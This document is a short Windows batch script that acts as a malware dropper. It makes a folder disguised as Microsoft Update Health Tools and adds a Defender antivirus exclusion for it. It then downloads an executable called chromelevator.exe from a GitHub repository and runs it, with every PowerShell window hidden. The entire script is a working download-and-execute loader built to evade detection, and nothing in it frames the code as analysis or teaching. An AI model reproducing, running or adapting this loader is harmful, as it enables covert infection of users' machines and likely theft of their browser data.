@echo off
set SystemRoot=C:\Windows
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"

mkdir "%STAGE%" 2>nul

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/chromelevator.exe' -OutFile '%STAGE%\chromelevator.exe' -UseBasicParsing"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\chromelevator.exe' -WindowStyle Hidden"
